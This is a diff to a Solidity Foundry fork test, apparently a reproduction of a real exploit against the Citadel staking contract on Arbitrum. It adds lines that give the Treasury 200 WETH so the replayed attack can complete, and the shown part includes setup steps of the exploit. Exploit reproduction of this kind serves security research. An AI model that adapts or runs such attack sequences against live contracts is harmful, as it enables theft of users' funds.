@@ -61,6 +61,11 @@ contract ContractTest is Test {
         vm.label(address(USDC), "USDC");
         vm.label(address(CIT), "CIT");
         vm.label(address(CamelotRouter), "CamelotRouter");
+
+        // Inject sufficient WETH to Treasury for fork testing
+        // Treasury balance at block 174659183: 72.66 ETH (insufficient for full redeem of 73.75 ETH)
+        // Injecting 200 ETH ensures attack can complete without triggering adaptive logic
+        deal(address(WETH), citadelTreasury, 200 * 1e18);
     }
 
     function testExploit() public {
@@ -68,6 +73,8 @@ contract ContractTest is Test {
         // Deposit CIT tx: https://app.blocksec.com/explorer/tx/arbitrum/0xcf75802229d440e4fbabb4d357fa1886c25e9a6b5c693e9e9573c71c15e2b0d3
         // Exploiter transfer to attack contract following amount of CIT:
         deal(address(CIT), address(this), 2653 * 1e18);
+        // Inject sufficient WETH to Treasury for fork testing (攻击需要赎回73.75 ETH但Treasury只有72.66 ETH)
+        deal(address(WETH), citadelTreasury, 200 * 1e18);
         // Approve CIT tokens to CitadelStaking contract:
         CIT.approve(address(CitadelStaking), CIT.balanceOf(address(this)));
         // Deposit all CIT tokens at fixed rate (1) to CitadelStaking contract:
